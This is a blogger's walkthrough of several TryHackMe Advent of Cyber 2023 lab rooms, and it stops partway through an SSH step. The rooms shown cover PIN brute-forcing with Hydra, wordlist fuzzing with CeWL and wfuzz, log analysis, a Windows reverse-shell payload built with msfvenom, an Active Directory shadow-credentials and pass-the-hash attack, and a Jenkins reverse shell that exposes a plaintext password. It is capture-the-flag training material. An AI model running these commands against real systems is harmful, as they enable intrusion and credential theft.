---
title: "TryHackme: Advent of Cyber 2023"
author: NeoVirex
categories: [TryHackMe]
tags: [Advent, Cyber, "2023"]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_advent_of_cyber_2023/
image:
  path: room_img1.png
description: Learn the basics
---
##  [Day 3] Brute-forcing Hydra is Coming to Town

###   challenge 

**the challenge is creaking the pin.** it is hosted in port 8000 it is 3 digit code.
    
![fornt-screen.png](img1.png){: width="600" height="150" .shadow }
    
### Creating the script 
I need 3 digit code from 1 to 9 and that have characters for A to F.
- **Crunch** 
    - **FLAGS** how the command work
        - `3` the first number is the minimum length of the generated password
        - `3` the second number is the maximum length of the generated password
        - `0123456789ABCDEF` is the character set to use to generate the passwords
        - `o 3digits.txt` saves the output to the `3digits.txt` file
    
```bash
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```
    
- **Creaking the PIN with Hydra**
    - **FLAGS** how to use the commands
        - `l ''` indicates that the login name is blank as the security lock only requires a password
        - `P 3digits.txt` specifies the password file to use
        - `f` stops Hydra after finding a working password
        - `v` provides verbose output and is helpful for catching errors
        - `10.10.183.89` is the IP address of the target
        - `http-post-form` specifies the HTTP method to use
        - `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
            - `/login.php` is the page where the PIN code is submitted
            - `pin=^PASS^` will replace `^PASS^` with values from the password list
            - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
        - `s 8000` indicates the port number on the target
    
    ```bash
    hydra -l '' -P 3digits.txt -f -v 10.10.183.89 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
    ```
    
    - Result the PIN
        
        ```bash

        [VERBOSE] Page redirected to http[s]://10.10.183.89:8000/error.php
        [VERBOSE] Page redirected to http[s]://10.10.183.89:8000/error.php
        [VERBOSE] Page redirected to http[s]://10.10.183.89:8000/error.php
        [8000][http-post-form] host: 10.10.183.89   password: 6F5
        [STATUS] attack finished for 10.10.183.89 (valid pair found)
        1 of 1 target successfully completed, 1 valid password found
        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-27 10:19:38
                 
        ```
        

### flag

THM{pin********force}

![Screenshot From 2025-02-27 10-24-10.png](img2.png){: width="600" height="150" .shadow }



##  [Day 4] Brute-forcing Baby, It's CeWLd Outside"
 date: 2025-02-27

![Site Screenshot](room_img4.png){: width="600" height="150" .shadow }
###  Challenge
The target website is running on **10.10.229.135**. We’ll use CeWL to spider the site and generate wordlists for both usernames and passwords.

![Site Screenshot](img41.png){: width="600" height="150" .shadow }

###  Generate Wordlists with CeWL

####  Password List
Use depth of 2 and minimum word length of 5, include numbers:
```bash
cewl -d 2 -m 5 --with-numbers -w passwords.txt http://10.10.229.135
```

####  Username List
Crawl only the team page (depth 0), lowercase output:
```bash
cewl -d 0 -m 5 --lowercase -w usernames.txt http://10.10.229.135/team.php
```

> **Flags explained**  
> - `-d <n>`: spidering depth (e.g. `-d 2`)  
> - `-m <min>` / `-x <max>`: minimum/maximum word length  
> - `--with-numbers`: include numeric variants  
> - `--lowercase`: force output to lowercase  
> - `-w <file>`: write output to file

###  Brute-Force with Wfuzz

Use both wordlists to fuzz the login form, hiding “Please enter the correct credentials” responses:
```bash
wfuzz -c   -z file,usernames.txt   -z file,passwords.txt   --hs "Please enter the correct credentials"   -u http://10.10.229.135/login.php   -d "username=FUZZ&password=FUZ2Z"
```

> **Wfuzz flags**  
> - `-c`: colored output  
> - `-z file,<path>`: load payloads from file  
> - `--hs "<string>"`: skip responses containing the string  
> - `-u <URL>`: target URL  
> - `-d "<data>"`: POST data template (`FUZZ` for usernames, `FUZ2Z` for passwords)

###  Results

```text
000006317:   302 … "isaias - Happiness"
```

```text
000000022:   302 … "isaias - Happiness"
```

The successful login pair is:

```bash
Username: isaias
Password: Happiness
```

###  Flag


```bash
THM{m3rrY4n**hiden**1crAft$}
```

## [Day 5] Reverse engineering A Christmas DOScovery: Tapes of Yule-tide Past

| File Format | Magic Bytes | ASCII representation |
| --- | --- | --- |
| PNG image file | 89 50 4E 47 0D 0A 1A 0A | %PNG |
| GIF image file | 47 49 46 38 | GIF8 |
| Windows and DOS executables | 4D 5A | MZ |
| Linux ELF executables | 7F 45 4C 46 | .ELF |
| MP3 audio file | 49 44 33 | ID3 |

**Common DOS commands and Utilities:**

| CD | Change Directory |
| --- | --- |
| DIR | Lists all files and directories in the current directory |
| TYPE | Displays the contents of a text file |
| CLS | Clears the screen |
| HELP | Provides help information for DOS commands |
| EDIT | The MS-DOS Editor |




##  [Day 7] Log analysis ‘Tis the season for log chopping!



### Questions

> How many unique domains were accessed by all workstations?
> 

Hint: use the command **cut -d ‘ ’ -f3 access.log | cut -d ‘:’ -f1 | sort | uniq -c | sort -nr | wc -l**

Answer: **111**

> What status code is generated by the HTTP requests to the least accessed domain?
> 

Hint: use the command **grep partnerservices.getmicrosoftkey.com** **access.log | cut -d ‘ ’ -f6**

Answer: **503**

> Based on the high count of connection attempts, what is the name of the suspicious domain?
> 

Hint: use the command **cut -d ‘ ’ -f3 access.log | cut -d ‘:’ -f1 | sort | uniq -c | sort -n | tail -n 10**

Answer: **frostlings.bigbadstash.thm**

> What is the source IP of the workstation that accessed the malicious domain?
> 

Hint: use the command **grep frostlings.bigbadstash.thm** **access.log | head -n 3**

Answer: **10.10.185.225**

> How many requests were made on the malicious domain in total?
> 

Hint: use the command **cut -d ‘ ’ -f3 access.log | cut -d ‘:’ -f1 | sort | uniq -c | sort -n | tail -n 10**

Answer: **1581**

> Having retrieved the exfiltrated data, what is the hidden flag?
> 

Hint: use the command **grep frostlings.bigbadstash.thm** **access.log | cut -d ‘=’ -f2 | cut -d ‘ ’ -f1 | base64 -d**

```jsx

ubuntu@tryhackme:~/Desktop/artefacts$ 
ubuntu@tryhackme:~/Desktop/artefacts$ grep frostlings.bigbadstash.thm access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d
id,recipient,gift
ddbe9f0258a804c8a15cf524e32e1785,Noah,Play Cash Register
cb597d69d83f24c75b2a2d7298705ed7,William,Toy Pirate Hat
4824fb68fe63146aabc3587f8e12fb90,Charlotte,Play-Doh Bakery Set
f619a90e1fdedc23e515c7d6804a0811,Benjamin,Soccer Ball
ce6b67dee0f69a384076e74b922cd46b,Isabella,DIY Jewelry Kit
939481085d8ac019f79d5bd7307ab008,Lucas,Building Construction Blocks
f706a56dd55c1f2d1d24fbebf3990905,Amelia,Play-Doh Kitchen
......
...
ubuntu@tryhackme:~/Desktop/artefacts$ 

```

Answer: **THM{a_gift_for_**hiden**_awesome_analyst!}**



## [Day 10] SQL injection Inject the Halls with EXEC Querie


```bash
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.23.89.97 LPORT=4444 -f exe -o re.exe     
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: re.exe
                    
```

```bash                                                                                                         
┌──(nei㉿kali)-[~/pro]
└─$ l 
install  inst.apk  re.exe  reverse.exe  robots/  vpn/
                                                                                                               
┌──(nei㉿kali)-[~/pro]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.62.90 - - [30/Mar/2025 04:24:21] "GET /re.exe HTTP/1.1" 200 -
10.10.62.90 - - [30/Mar/2025 04:24:21] "GET /re.exe HTTP/1.1" 200 -
10.10.62.90 - - [30/Mar/2025 04:24:22] "GET /re.exe HTTP/1.1" 200 -
10.10.62.90 - - [30/Mar/2025 04:24:22] "GET /re.exe HTTP/1.1" 200 -

```
In the windows cmd 
```bash
C:\Windows\system32>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
10/12/2023  07:01 PM    <DIR>          inetpub
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/03/2023  07:29 PM    <DIR>          PHP
10/12/2023  03:48 PM    <DIR>          Program Files
10/03/2023  06:26 PM    <DIR>          Program Files (x86)
10/03/2023  05:32 PM    <DIR>          SQL2022
03/17/2021  03:00 PM    <DIR>          Users
10/03/2023  05:27 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)  10,498,224,128 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

03/17/2021  03:00 PM    <DIR>          .
03/17/2021  03:00 PM    <DIR>          ..
03/30/2025  07:51 AM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  10,498,224,128 bytes free

C:\Users>cd Adminstrator
cd Adminstrator
The system cannot find the path specified.

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator

03/30/2025  07:51 AM    <DIR>          .
03/30/2025  07:51 AM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          3D Objects
03/17/2021  03:13 PM    <DIR>          Contacts
11/02/2023  08:48 PM    <DIR>          Desktop
11/02/2023  08:42 PM    <DIR>          Documents
10/24/2023  12:04 AM    <DIR>          Downloads
03/17/2021  03:13 PM    <DIR>          Favorites
03/17/2021  03:13 PM    <DIR>          Links
03/17/2021  03:13 PM    <DIR>          Music
03/17/2021  03:13 PM    <DIR>          Pictures
03/17/2021  03:13 PM    <DIR>          Saved Games
03/17/2021  03:13 PM    <DIR>          Searches
03/17/2021  03:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,498,224,128 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

11/02/2023  08:48 PM    <DIR>          .
11/02/2023  08:48 PM    <DIR>          ..
10/24/2023  01:28 AM    <DIR>          1 
11/02/2023  08:48 PM    <DIR>          backups
11/02/2023  08:05 PM               339 deface_website.bat
10/24/2023  12:03 AM               651 Note.txt
11/02/2023  08:05 PM               388 restore_website.bat
               3 File(s)          1,378 bytes
               4 Dir(s)  10,498,134,016 bytes free

C:\Users\Administrator\Desktop>type Note.txt
type Note.txt
====================
Hey h4ck3r0192,

I recieved your Bitcoin payment, thanks again for a speedy transaction.

After you gain access to the server, you can deface the website by running the deface_website.bat script in C:\Users\Administrator\Desktop. Feel free to dump the database and steal whatever you want.

If you need to revert the changes back to the original site for any reason, just run restore_website.bat from the same directory.

Also, I shouldn't need to mention this, but PLEASE DELETE this Note.txt file after defacing the website! Do NOT let this hack tie back to me.

-Gr33dstr

THM{b06674fed****************76d3d51409e}

C:\Users\Administrator\Desktop>dir
dir                                                                         
 Volume in drive C has no label.                                            
 Volume Serial Number is A8A4-C362                                          
                                                                            
 Directory of C:\Users\Administrator\Desktop                                
                                                                            
11/02/2023  08:48 PM    <DIR>          .                                    
11/02/2023  08:48 PM    <DIR>          ..                                   
10/24/2023  01:28 AM    <DIR>          1                                    
11/02/2023  08:48 PM    <DIR>          backups                              
11/02/2023  08:05 PM               339 deface_website.bat                   
10/24/2023  12:03 AM               651 Note.txt                             
11/02/2023  08:05 PM               388 restore_website.bat                  
               3 File(s)          1,378 bytes                               
               4 Dir(s)  10,497,871,872 bytes free                          
                                                                            
C:\Users\Administrator\Desktop>restore_website.bat                          
restore_website.bat                                                         
Removing all files and folders from C:\inetpub\wwwroot...                   
Website restoration completed. Please refresh the home (/index.php) page to see the changes and obtain your flag!

C:\Users\Administrator\Desktop>

```

![Screenshot From 2025-03-30 04-48-56.png](img101.png)



## [Day 11] Active Directory Jingle Bells, Shadow Spells

![Screenshot From 2025-03-30 04-49-21.png](img1101.png)
- We can enumerate the privileges by running:
    
    Find-InterestingDomainAcl -ResolveGuids
    
    ```bash
    PS C:\Users\hr> cd C:\Users\hr\Desktop
    PS C:\Users\hr\Desktop> powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.
    
    PS C:\Users\hr\Desktop> . .\PowerView.ps1
    PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids
    
    ObjectDN                : CN=SOUTHPOLE,OU=Domain Controllers,DC=AOC,DC=local
    AceQualifier            : AccessAllowed
    ActiveDirectoryRights   : GenericAll
    ObjectAceType           : None
    AceFlags                : None
    AceType                 : AccessAllowed
    InheritanceFlags        : None
    SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1111
    IdentityReferenceName   : tracymcgreedy
    IdentityReferenceDomain : AOC.local
    IdentityReferenceDN     : CN=tracymcgreedy,CN=Users,DC=AOC,DC=local
    IdentityReferenceClass  : user
    
    ObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=AOC,DC=local
    AceQualifier            : AccessAllowed
    ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                              GenericWrite, WriteDacl, WriteOwner
    ObjectAceType           : None
    AceFlags                : ContainerInherit, Inherited
    AceType                 : AccessAllowed
    InheritanceFlags        : ContainerInherit
    SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1109
    IdentityReferenceName   : DnsAdmins
    IdentityReferenceDomain : AOC.local
    IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=AOC,DC=local
    IdentityReferenceClass  : group
    
    ObjectDN                : DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=AOC,DC=local
    AceQualifier            : AccessAllowed
    ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                              GenericWrite, WriteDacl, WriteOwner
    ObjectAceType           : None
    AceFlags                : ContainerInherit, Inherited
    AceType                 : AccessAllowed
    InheritanceFlags        : ContainerInherit
    SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1109
    IdentityReferenceName   : DnsAdmins
    IdentityReferenceDomain : AOC.local
    IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=AOC,DC=local
    IdentityReferenceClass  : group
    
  ...
    ```
    

```bash
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite


> 
> 
> 
> PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
> [*] No path was provided. The certificate will be printed as a Base64 blob
> [*] No pass was provided. The certificate will be stored with the password DOgcsF93pI0BRaqH
> [*] Searching for the target account
> [*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
> [*] Generating certificate
> [*] Certificate generaged
> [*] Generating KeyCredential
> [*] KeyCredential generated with DeviceID 8de331cd-4e1c-435d-b788-3dc4cc40894d
> [*] Updating the msDS-KeyCredentialLink attribute of the target object
> [+] Updated the msDS-KeyCredentialLink attribute of the target object
> [*] You can now run Rubeus with the following syntax:
> 
> Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"DOgcsF93pI0BRaqH" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
> PS C:\Users\hr\Desktop>
> 

```bash
└─$ evil-winrm -i 10.10.229.249 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                       
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\vansprinkles\Documents> ls
*Evil-WinRM* PS C:\Users\vansprinkles\Documents> dir
*Evil-WinRM* PS C:\Users\vansprinkles\Documents> cd ..
*Evil-WinRM* PS C:\Users\vansprinkles> dir

    Directory: C:\Users\vansprinkles

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       11/14/2018   6:56 AM                Desktop
d-r---       11/15/2023   9:29 PM                Documents
d-r---        9/15/2018   7:19 AM                Downloads
d-r---        9/15/2018   7:19 AM                Favorites
d-r---        9/15/2018   7:19 AM                Links
d-r---        9/15/2018   7:19 AM                Music
d-r---        9/15/2018   7:19 AM                Pictures
d-----        9/15/2018   7:19 AM                Saved Games
d-r---        9/15/2018   7:19 AM                Videos

*Evil-WinRM* PS C:\Users\vansprinkles> cd Desktop
*Evil-WinRM* PS C:\Users\vansprinkles\Desktop> ls

    Directory: C:\Users\vansprinkles\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website

*Evil-WinRM* PS C:\Users\vansprinkles\Desktop> cd ..
*Evil-WinRM* PS C:\Users\vansprinkles> cd ..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/3/2025   3:37 PM                Administrator
d-----       10/13/2023  12:04 PM                ecogremlin
d-----         4/3/2025   3:29 PM                hr
d-r---       11/22/2023  10:57 AM                Public
d-----       10/13/2023  12:52 PM                santa
d-----       10/24/2023   1:13 PM                TEMP
d-----       10/13/2023   1:01 PM                user
d-----       11/15/2023   9:29 PM                vansprinkles

*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---       11/22/2023  10:56 AM                Desktop
d-r---       11/22/2023  10:56 AM                Documents
d-r---        3/17/2021   3:13 PM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---       11/22/2023  10:40 AM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos

*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/22/2023  10:56 AM                chatlog_files
-a----       11/22/2023  10:29 AM          11620 chatlog.html
-a----       10/16/2023   7:33 AM             17 flag.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
THM{XMAS_****hiden****_SAFE}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 


```


## [Day 12] Defence in depth Sleighing Threats, One Layer at a Time


- all the terminal
    
    ```bash
    $ nc -nvlp 6996
    listening on [any] 6996 ...
    connect to [10.23.89.97] from (UNKNOWN) [10.10.28.207] 58018
    ls
    config.xml
    config.xml.bak
    hudson.model.UpdateCenter.xml
    hudson.plugins.git.GitTool.xml
    identity.key.enc
    jenkins.install.InstallUtil.lastExecVersion
    jenkins.install.UpgradeWizard.state
    jenkins.model.JenkinsLocationConfiguration.xml
    jenkins.plugins.git.GitHooksConfiguration.xml
    jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
    jenkins.security.QueueItemAuthenticatorConfiguration.xml
    jenkins.security.UpdateSiteWarningsConfiguration.xml
    jenkins.telemetry.Correlator.xml
    jobs
    logs
    nodeMonitors.xml
    nodes
    org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
    plugins
    queue.xml.bak
    secret.key
    secret.key.not-so-secret
    secrets
    updates
    userContent
    users
    workspace
    ls
    config.xml
    config.xml.bak
    hudson.model.UpdateCenter.xml
    hudson.plugins.git.GitTool.xml
    identity.key.enc
    jenkins.install.InstallUtil.lastExecVersion
    jenkins.install.UpgradeWizard.state
    jenkins.model.JenkinsLocationConfiguration.xml
    jenkins.plugins.git.GitHooksConfiguration.xml
    jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
    jenkins.security.QueueItemAuthenticatorConfiguration.xml
    jenkins.security.UpdateSiteWarningsConfiguration.xml
    jenkins.telemetry.Correlator.xml
    jobs
    logs
    nodeMonitors.xml
    nodes
    org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
    plugins
    queue.xml.bak
    secret.key
    secret.key.not-so-secret
    secrets
    updates
    userContent
    users
    workspace
    cd users
    ls
    admin_17026156214276373646
    infraadmin_228839177270308121
    users.xml
    python -c 'import pty; pty.spawn("/bin/bash")'
    /bin/bash: line 5: python: command not found
    
    script /dev/null -c bash
    Script started, output log file is '/dev/null'.
    jenkins@jenkins:~/users$ ls
    ls
    admin_17026156214276373646  infraadmin_228839177270308121  users.xml
    jenkins@jenkins:~/users$ cat users.xml
    cat users.xml
    <?xml version='1.1' encoding='UTF-8'?>
    <hudson.model.UserIdMapper>
      <version>1</version>
      <idToDirectoryNameMap class="concurrent-hash-map">
        <entry>
          <string>infra_admin</string>
          <string>infraadmin_228839177270308121</string>
        </entry>
        <entry>
          <string>admin</string>
          <string>admin_17026156214276373646</string>
        </entry>
      </idToDirectoryNameMap>
    </hudson.model.UserIdMapper>jenkins@jenkins:~/users$ cd ..
    cd ..
    jenkins@jenkins:~$ pwd
    pwd
    /var/lib/jenkins
    jenkins@jenkins:~$ cd /opt
    cd /opt
    jenkins@jenkins:/opt$ ls
    ls
    scripts
    jenkins@jenkins:/opt$ cd scripts
    cd scripts
    jenkins@jenkins:/opt/scripts$ ls
    ls
    backup.sh
    jenkins@jenkins:/opt/scripts$ cat back.sh
    cat back.sh
    cat: back.sh: No such file or directory
    ```
    
    ```bash
    jenkins@jenkins:/opt/scripts$ cat backup.sh
    cat backup.sh
    #!/bin/sh
    
    mkdir /var/lib/jenkins/backup
    mkdir /var/lib/jenkins/backup/jobs /var/lib/jenkins/backup/nodes /var/lib/jenkins/backup/plugins /var/lib/jenkins/backup/secrets /var/lib/jenkins/backup/users
    
    cp /var/lib/jenkins/*.xml /var/lib/jenkins/backup/
    cp -r /var/lib/jenkins/jobs/ /var/lib/jenkins/backup/jobs/
    cp -r /var/lib/jenkins/nodes/ /var/lib/jenkins/backup/nodes/
    cp /var/lib/jenkins/plugins/*.jpi /var/lib/jenkins/backup/plugins/
    cp /var/lib/jenkins/secrets/* /var/lib/jenkins/backup/secrets/
    cp -r /var/lib/jenkins/users/* /var/lib/jenkins/backup/users/
    
    tar czvf /var/lib/jenkins/backup.tar.gz /var/lib/jenkins/backup/
    /bin/sleep 5
    
    username="tracy"
    password="13_1n_33"
    Ip="localhost"
    sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz $username@$Ip:/home/tracy/backups
    /bin/sleep 10
    
    rm -rf /var/lib/jenkins/backup/
    rm -rf /var/lib/jenkins/backup.tar.gz
    jenkins@jenkins:/opt/scripts$ 
    ```
Back to kali and starting ssh in add
    ```bash
    ─(nei㉿kali)-[~]
    └─$ ssh admin@10.10.28.207
    The authenticity of host '10.10.28.207 (10.10.28.207)' can't be established.
